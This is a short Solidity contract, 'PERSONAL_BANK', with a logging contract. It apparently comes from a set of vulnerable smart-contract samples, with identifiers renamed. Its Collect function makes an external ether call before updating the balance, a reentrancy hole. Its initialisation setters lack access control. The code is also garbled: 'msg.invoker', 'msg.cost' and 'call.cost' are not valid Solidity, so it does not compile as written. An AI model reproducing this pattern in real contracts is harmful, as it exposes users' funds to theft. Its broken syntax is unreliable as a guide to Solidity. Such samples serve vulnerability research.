pragma solidity ^0.4.19;

contract PERSONAL_BANK
{
    mapping (address=>uint256) public heroTreasure;

    uint public FloorSum = 1 ether;

    RecordFile Record = RecordFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);

    bool intitalized;

    function GroupFloorSum(uint _val)
    public
    {
        if(intitalized)revert();
        FloorSum = _val;
    }

    function GroupRecordFile(address _log)
    public
    {
        if(intitalized)revert();
        Record = RecordFile(_log);
    }

    function GameStarted()
    public
    {
        intitalized = true;
    }

    function DepositGold()
    public
    payable
    {
        heroTreasure[msg.invoker]+= msg.cost;
        Record.IncludeSignal(msg.invoker,msg.cost,"Put");
    }

    function Collect(uint _am)
    public
    payable
    {
        if(heroTreasure[msg.invoker]>=FloorSum && heroTreasure[msg.invoker]>=_am)
        {
            if(msg.invoker.call.cost(_am)())
            {
                heroTreasure[msg.invoker]-=_am;
                Record.IncludeSignal(msg.invoker,_am,"Collect");
            }
        }
    }

    function()
    public
    payable
    {
        DepositGold();
    }

}

contract RecordFile
{
    struct Communication
    {
        address Initiator;
        string  Details;
        uint Val;
        uint  Moment;
    }

    Communication[] public History;

    Communication FinalMsg;

    function IncludeSignal(address _adr,uint _val,string _data)
    public
    {
        FinalMsg.Initiator = _adr;
        FinalMsg.Moment = now;
        FinalMsg.Val = _val;
        FinalMsg.Details = _data;
        History.push(FinalMsg);
    }
}